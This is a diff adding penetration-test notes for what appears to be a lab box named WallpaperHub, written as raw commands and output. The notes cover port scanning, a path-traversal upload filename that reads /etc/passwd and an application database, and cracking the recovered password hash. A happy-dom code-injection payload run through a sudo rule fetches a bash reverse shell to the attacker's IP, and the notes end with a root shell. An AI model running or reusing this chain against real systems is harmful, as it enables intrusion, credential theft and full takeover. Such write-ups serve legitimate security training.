@@ -1,0 +1,75 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.244.204 > WallpaperHub.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
+|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
+|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Wallpaper Hub - Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+# go to 5000, register a user test. try upload file. Burpsuit add:
+Content-Disposition: form-data; name="file"; filename="../../../../../../../etc/passwd"
+Content-Type: text/plain
+
+http://192.168.244.204:5000/my-uploads 
+download file:
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+wp_hub:x:1001:1001::/home/wp_hub:/bin/bash
+
+./../../../../../../home/wp_hub/.bash_history
+sqlite3 ~/wallpaper_hub/database.db
+./../../../../../../home/wp_hub/wallpaper_hub/database.db
+
+$ strings database.db
+wp_hub$2b$12$lgsrjRa0imePu9iSnp1UsOPLWqAKKYym/z5R59UijsYZ5ss1nwijS
+
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
+wp_hub:qazwsxedc
+
+$ ssh wp_hub@192.168.244.204
+wp_hub@wallpaperhub:~$ id
+uid=1001(wp_hub) gid=1001(wp_hub) groups=1001(wp_hub)
+
+Linux version 6.8.0-48-generic (buildd@lcy02-amd64-010) (x86_64-linux-gnu-gcc-13 (Ubuntu 13.2.0-23ubuntu4) 13.2.0, GNU ld (GNU Binutils for Ubuntu) 2.42) #48-Ubuntu SMP PREEMPT_DYNAMIC Fri Sep 27 14:04:52 UTC 2024
+User wp_hub may run the following commands on wallpaperhub:
+    (root) NOPASSWD: /usr/bin/web-scraper /root/web_src_downloaded/*.html
+
+wp_hub@wallpaperhub:/tmp$ cat /usr/bin/web-scraper
+#!/usr/bin/env node
+
+const fs = require('fs');
+const { Window } = require("happy-dom");
+
+# This file is importing the ‘happy-dom’ library, which is vulnerable to CVE-2024–51757 for Arbitrary Code Injection: refer to https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065?source=post_page-----26b28458bf50---------------------------------------
+
+create 2 files at /tmp
+cat pwn.sh
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.45.154/5000 0>&1
+
+cat pwn.html
+const { Window } = require("happy-dom");
+
+const window = new Window();
+const document = window.document;
+
+document.write(`<script src="https://localhost:8080/'+require('child_process').execSync('/tmp/pwn.sh')+'"></script>`);
+
+wp_hub@wallpaperhub:/tmp$ sudo /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/pwn.html
+
+$ rlwrap nc -nlvp 5000
+listening on [any] 5000 ...
+connect to [192.168.45.154] from (UNKNOWN) [192.168.244.204] 35512
+root@wallpaperhub:/tmp# id                
+uid=0(root) gid=0(root) groups=0(root)
+
+
